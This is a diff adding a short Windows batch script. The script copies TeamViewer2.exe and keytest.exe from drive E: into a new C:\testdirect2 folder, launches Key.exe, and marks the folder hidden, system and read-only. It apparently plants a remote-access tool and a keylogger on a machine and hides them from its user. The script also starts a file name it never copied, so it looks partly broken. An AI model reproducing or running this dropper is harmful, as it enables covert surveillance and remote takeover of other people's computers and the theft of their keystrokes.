@@ -1,0 +1,29 @@
+cd ..
+cd ..
+cd ..
+cd ..
+mkdir testdirect2
+
+
+
+E:
+copy E:\TeamViewer2.exe C:\testdirect2
+copy E:\keytest.exe C:\testdirect2
+D:
+
+F:
+
+C:
+
+cd ..
+cd ..
+cd ..
+cd testdirect2
+
+
+
+start Key.exe
+cd ..
+attrib +h +r +s "testdirect2"
+
+PAUSE
